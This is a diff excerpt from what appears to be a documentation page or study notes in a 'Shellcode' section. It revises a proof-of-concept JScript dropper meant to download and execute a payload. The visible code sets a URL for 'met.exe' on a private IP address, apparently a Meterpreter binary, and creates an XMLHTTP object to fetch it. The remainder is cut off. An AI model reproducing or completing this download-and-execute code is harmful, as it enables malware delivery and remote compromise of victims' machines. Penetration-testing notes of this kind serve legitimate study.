@@ -5,7 +5,7 @@ parent: Shellcode
 nav_order: 2
 ---
 
-POC code to download and execute payload:
+POC code to download and execute payload (save it as *.js):
 ```
 var url = "http://192.168.119.120/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
